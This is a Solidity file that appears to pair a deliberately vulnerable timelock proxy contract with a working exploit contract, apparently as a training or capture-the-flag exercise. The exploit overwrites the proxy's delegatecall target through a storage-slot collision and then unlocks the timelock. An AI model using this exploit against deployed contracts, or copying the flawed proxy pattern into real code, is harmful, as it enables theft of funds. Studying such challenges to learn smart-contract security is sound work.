// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


import { Facet } from "./facet.sol";


contract LongTimeLockProxy {

    address public facet;
    bool public unlocked;
    uint public constant waitTime = 100 days;

    constructor(){
        facet = address(new Facet());
    }

    fallback() external payable {
        address _facet = facet;
        assembly {
            // copy function selector and any arguments
            calldatacopy(0, 0, calldatasize())
             // execute function call using the facet
            let result := delegatecall(gas(), _facet, 0, calldatasize(), 0, 0)
            // get any return value
            returndatacopy(0, 0, returndatasize())
            // return any return value or error back to the caller
            switch result
                case 0 {
                    revert(0, returndatasize())
                }
                default {
                    return(0, returndatasize())
                }
        }
    }

    receive() external payable {}

}

interface  funcs {
    function setTimeZone(uint _timeZone) external;
    function changeUnLocked() external;
}

contract AttackLongTimeLockProxy {

    function attack(address _proxy) external {
        HelperFacet _insFacet = new HelperFacet();
        uint _newFacetAdress = uint256(uint160(address(_insFacet)));
        funcs _funcs = funcs(_proxy);
        _funcs.setTimeZone(_newFacetAdress);
        _funcs.changeUnLocked();
    }

}

contract HelperFacet {

    address public facet;
    bool public unlocked;
    uint public constant waitTime = 100 days;

    function changeUnLocked() external {
        unlocked = true;
    }
    
}